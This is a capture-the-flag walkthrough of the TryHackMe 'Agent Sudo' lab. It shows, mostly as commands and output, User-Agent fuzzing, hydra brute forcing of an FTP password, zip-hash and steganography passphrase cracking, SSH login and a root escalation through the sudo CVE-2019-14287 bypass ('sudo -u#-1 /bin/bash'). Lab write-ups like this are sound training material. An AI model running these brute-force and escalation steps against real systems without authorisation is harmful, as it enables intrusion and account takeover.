# Agent Sudo [THM](https://tryhackme.com/room/agentsudoctf)

## Enumeration

Let see what this box has

```bash
nmap -Pn -T4 -sV -A 10.10.21.10

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.              
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-27 23:41 GMT                                              
Nmap scan report for 10.10.21.10                                                                             
Host is up (0.040s latency).                                                                                 
Not shown: 997 closed ports                                                                                  
PORT   STATE SERVICE VERSION                                                                                 
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.35 seconds
```

### How many open ports?
3

---

Let explore the service on the port 80


```bash
curl http://10.10.21.10:80

<!DocType html>
<html>
<head>
        <title>Annoucement</title>
</head>

<body>
<p>
        Dear agents,
        <br><br>
        Use your own <b>codename</b> as user-agent to access the site.
        <br><br>
        From,<br>
        Agent R
</p>
</body>
</html>
```

As the message on the home of the site suggest while using a specific user agent we get 

> What are you doing! Are you one of the 25 employees? If not, I going to report this incident

Now we know that we have 25 agents, we can go try different values to see what we get.


```bash
ffuf -c -w letters -u http://10.10.21.10 -H "User-Agent: FUZZ"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.21.10
 :: Wordlist         : FUZZ: letters
 :: Header           : User-Agent: FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

I                       [Status: 200, Size: 218, Words: 13, Lines: 19]
M                       [Status: 200, Size: 218, Words: 13, Lines: 19]
V                       [Status: 200, Size: 218, Words: 13, Lines: 19]
K                       [Status: 200, Size: 218, Words: 13, Lines: 19]
H                       [Status: 200, Size: 218, Words: 13, Lines: 19]
X                       [Status: 200, Size: 218, Words: 13, Lines: 19]
Q                       [Status: 200, Size: 218, Words: 13, Lines: 19]
O                       [Status: 200, Size: 218, Words: 13, Lines: 19]
W                       [Status: 200, Size: 218, Words: 13, Lines: 19]
Z                       [Status: 200, Size: 218, Words: 13, Lines: 19]
J                       [Status: 200, Size: 218, Words: 13, Lines: 19]
P                       [Status: 200, Size: 218, Words: 13, Lines: 19]
U                       [Status: 200, Size: 218, Words: 13, Lines: 19]
B                       [Status: 200, Size: 218, Words: 13, Lines: 19]
T                       [Status: 200, Size: 218, Words: 13, Lines: 19]
N                       [Status: 200, Size: 218, Words: 13, Lines: 19]
S                       [Status: 200, Size: 218, Words: 13, Lines: 19]

C                       [Status: 302, Size: 218, Words: 13, Lines: 19]

Y                       [Status: 200, Size: 218, Words: 13, Lines: 19]
F                       [Status: 200, Size: 218, Words: 13, Lines: 19]
E                       [Status: 200, Size: 218, Words: 13, Lines: 19]
D                       [Status: 200, Size: 218, Words: 13, Lines: 19]
R                       [Status: 200, Size: 310, Words: 31, Lines: 19]
G                       [Status: 200, Size: 218, Words: 13, Lines: 19]
A                       [Status: 200, Size: 218, Words: 13, Lines: 19]
L                       [Status: 200, Size: 218, Words: 13, Lines: 19]
:: Progress: [26/26] :: Job [1/1] :: 6 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

As we can see the agent "C" is a potential candidate. 
A deeper analyse of the headers reveals a PHP page.

```bash
curl -I -H "User-Agent: C" http://10.10.21.10:80

HTTP/1.1 302 Found
Date: Mon, 28 Dec 2020 00:58:02 GMT
Server: Apache/2.4.29 (Ubuntu)
Location: agent_C_attention.php
Content-Type: text/html; charset=UTF-8
```

```bash
curl http://10.10.21.10/agent_C_attention.php

Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
```

### How you redirect yourself to a secret page?
user-agent

### What is the agent name?
Chris

## Hash cracking and brute-force 

### FTP password

Let brute force the ftp in research of chris password

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.21.10

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-28 01:20:37
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344370 login tries (l:1/p:14344370), ~896524 tries per task
[DATA] attacking ftp://10.10.21.10:21/

[21][ftp] host: 10.10.21.10   login: chris   password: XXXXXXXXXXX

1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-28 01:21:35
```

We have managed to find Chris password, which gives us access to the FTP

```bash
ftp 10.10.21.10
Connected to 10.10.21.10.
220 (vsFTPd 3.0.3)
Name (10.10.21.10:clobee): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls -ail
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Oct 29  2019 .
drwxr-xr-x    2 0        0            4096 Oct 29  2019 ..
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.

ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
226 Transfer complete.
217 bytes received in 0.00 secs (2.5237 MB/s)

ftp> get cute-alien.jpg
local: cute-alien.jpg remote: cute-alien.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
226 Transfer complete.
33143 bytes received in 0.05 secs (604.1403 kB/s)

ftp> get cutie.png
local: cutie.png remote: cutie.png
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
226 Transfer complete.
34842 bytes received in 0.06 secs (602.3579 kB/s)

ftp> quit
221 Goodbye.
```

We now have to go through the files we retrieved from the server

```bash
cat To_agentJ.txt

Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

```bash
binwalk -e cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```
```bash 
ls
total 12
10224678 drwxr-xr-x 3 clobee 4096 Dec 28 02:22 .
10224666 drwxr-xr-x 3 clobee 4096 Dec 28 02:17 ..
10224679 drwxr-xr-x 2 clobee 4096 Dec 28 02:22 _cutie.png.extracted
```

```bash
ls_cutie.png.extracted/

total 324
10224679 drwxr-xr-x 2 clobee   4096 Dec 28 02:22 .
10224678 drwxr-xr-x 3 clobee   4096 Dec 28 02:22 ..
10224684 -rw-r--r-- 1 clobee 279312 Dec 28 02:22 365
10224682 -rw-r--r-- 1 clobee  33973 Dec 28 02:22 365.zlib
10224686 -rw-r--r-- 1 clobee    280 Dec 28 02:22 8702.zip
10224736 -rw-r--r-- 1 clobee      0 Oct 29  2019 To_agentR.txt
```

```bash
unzip 8702.zip 

Archive:  8702.zip
skipping: To_agentR.txt           need PK compat. v5.1 (can do v4.6)
```

```bash
7za x 8702.zip 

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_GB.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i5-5257U CPU @ 2.70GHz (306D4),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Would you like to replace the existing file:
  Path:     ./To_agentR.txt
  Size:     0 bytes
  Modified: 2019-10-29 12:29:11
with the file from archive:
  Path:     To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 12:29:11
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y

                    
Enter password (will not be echoed):
Everything is Ok    

Size:       86
Compressed: 280
```

```bash
cat To_agentR.txt

Agent C,

We need to send the picture to 'YYYYYYY' as soon as possible!

By,
Agent R
```

This message is somehow encrypted. Thanks to [cyberchef](https://gchq.github.io/CyberChef/) we were able to discover the encoding type and the encoded value

```bash
 echo YYYYYY | base64 -d
 XXXXX
```

### Zip file password

```bash
zip2john 8702.zip > output.txt
```
```bash
cat output.txt 
8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:8702.zip
```
```bash
john output.txt

Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 11 candidates buffered for the current salt, minimum 32 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist

XXXXX            (8702.zip/To_agentR.txt)

1g 0:00:00:01 DONE 2/3 (2020-12-28 03:12) 0.8928g/s 40219p/s 40219c/s 40219C/s 123456..ferrises
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
### steg password

```bash
stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt

Stegseek version 0.4.1
[i] Read the entire wordlist (14344363 words), starting cracker
[ 528253 / 14344363 ]  (3.68%)                 
[i] --> Found passphrase: "XXXX"

[i] Original filename: "message.txt"
[i] Extracting to "cute-alien.jpg.out"
```

### Who is the other agent (in full name)?

```bash
cat cute-alien.jpg.out

Hi james,

Glad you find this message. Your login password is XXXXXXXXX

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

### SSH password

Thanks to `stegseek` we now have another user `james:XXXXXXXX`

```bash
ssh james@10.10.21.10

james@10.10.246.69's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Dec 28 03:16:25 UTC 2020

  System load:  0.0               Processes:           93
  Usage of /:   39.7% of 9.78GB   Users logged in:     0
  Memory usage: 32%               IP address for eth0: 10.10.21.10
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
````

## Capture the user flag

### What is the user flag?

```bash
james@agent-sudo:~$ ls /home
james

james@agent-sudo:~$ cat /home/james/
Alien_autospy.jpg          .bashrc                    .profile                   
.bash_history              .cache/                    .sudo_as_admin_successful  
.bash_logout               .gnupg/                    user_flag.txt              
````

### What is the incident of the photo called?

Let's download the image we found on James ssh account

```bash
python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
[ATTACKER_IP] - - [28/Dec/2020 04:39:21] "GET /Alien_autospy.jpg HTTP/1.1" 200 -
```

In my Kali

```bash
wget http://10.10.21.10:8000/Alien_autospy.jpg
--2020-12-28 04:39:26--  http://10.10.21.10:8000/Alien_autospy.jpg
Connecting to 10.10.21.10:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 42189 (41K) [image/jpeg]
Saving to: ‘Alien_autospy.jpg’

Alien_autospy.jpg           100%[========================================>]  41.20K  --.-KB/s    in 0.05s   

2020-12-28 04:39:26 (889 KB/s) - ‘Alien_autospy.jpg’ saved [42189/42189]
```

```bash
ls

total 100
10224666 drwxr-xr-x 3 clobee  4096 Dec 28 03:27 .
10224705 drwxr-xr-x 6 clobee  4096 Dec 27 23:39 ..
10224744 -rw-r--r-- 1 clobee    35 Dec 28 03:28 ‘Alien_autospy.jpg
```
To solve this question, we need to upload the image to Google (reverse search)

## Privilege escalation

```bash
james@agent-sudo:~$ sudo -l

[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

```bash
james@agent-sudo:~$ sudo /bin/bash -p
Sorry, user james is not allowed to execute '/bin/bash -p' as root on agent-sudo.
```

```bash
james@agent-sudo:~$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

### CVE number for the escalation 


```bash
searchsploit sudo 1.8

--------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                             |  Path
--------------------------------------------------------------------------- ---------------------------------
sudo 1.8.0 < 1.8.3p1 - 'sudo_debug' glibc FORTIFY_SOURCE Bypass + Privileg | linux/local/25134.c
sudo 1.8.0 < 1.8.3p1 - Format String                                       | linux/dos/18436.txt
Sudo 1.8.14 (RHEL 5/6/7 / Ubuntu) - 'Sudoedit' Unauthorized Privilege Esca | linux/local/37710.txt
Sudo 1.8.20 - 'get_process_ttyname()' Local Privilege Escalation           | linux/local/42183.c
Sudo 1.8.25p - 'pwfeedback' Buffer Overflow                                | linux/local/48052.sh
Sudo 1.8.25p - 'pwfeedback' Buffer Overflow (PoC)                          | linux/dos/47995.txt
sudo 1.8.27 - Security Bypass                                              | linux/local/47502.py
--------------------------------------------------------------------------- ---------------------------------
```

```bash
searchsploit -m 47502

  Exploit: sudo 1.8.27 - Security Bypass
      URL: https://www.exploit-db.com/exploits/47502
     Path: /usr/share/exploitdb/exploits/linux/local/47502.py
File Type: ASCII text, with CRLF line terminators

Copied to: /home/clobee/tmp/47502.py
```

```bash 
head 47502.py 
# Exploit Title : sudo 1.8.27 - Security Bypass
# Date : 2019-10-15
# Original Author: Joe Vennix
# Exploit Author : Mohin Paramasivam (Shad0wQu35t)
# Version : Sudo <1.2.28
# Tested on Linux
# Credit : Joe Vennix from Apple Information Security found and analyzed the bug
# Fix : The bug is fixed in sudo 1.8.28
# CVE : 2019-14287
```

### What is the root flag?

```bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash

root@agent-sudo:~# ls /root
root.txt

root@agent-sudo:~# cat /root/root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

By,
XXXXXX a.k.a Agent R
```
